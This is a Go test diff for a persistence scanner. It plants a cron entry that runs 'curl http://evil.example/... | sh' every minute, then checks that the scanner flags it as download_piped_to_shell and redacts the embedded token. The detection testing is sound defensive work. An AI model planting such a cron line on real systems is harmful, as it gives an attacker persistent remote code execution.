@@ -299,3 +299,23 @@ func TestPersistenceCollectsUserUnitsInLocalShare(t *testing.T) {
 	}
 	t.Fatalf("unit not collected: %+v", pf)
 }
+
+func TestPersistenceSignalsComeFromRawText(t *testing.T) {
+	root := t.TempDir()
+	os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0o755)
+	os.WriteFile(filepath.Join(root, "etc/cron.d/x"), []byte("* * * * * root curl http://evil.example/a?token=abc123 | sh\n"), 0o644)
+	files, _ := Persistence(root, nil, []byte("k"))
+	for _, p := range files {
+		if p.Path != "/etc/cron.d/x" {
+			continue
+		}
+		if len(p.Signals) != 1 || p.Signals[0].Line != 1 || p.Signals[0].Pattern != "download_piped_to_shell" {
+			t.Errorf("signals: %+v", p.Signals)
+		}
+		if strings.Contains(strings.Join(p.Lines, "\n"), "abc123") || p.Redactions == 0 {
+			t.Errorf("kept text not redacted: %q", p.Lines)
+		}
+		return
+	}
+	t.Fatal("file not collected")
+}
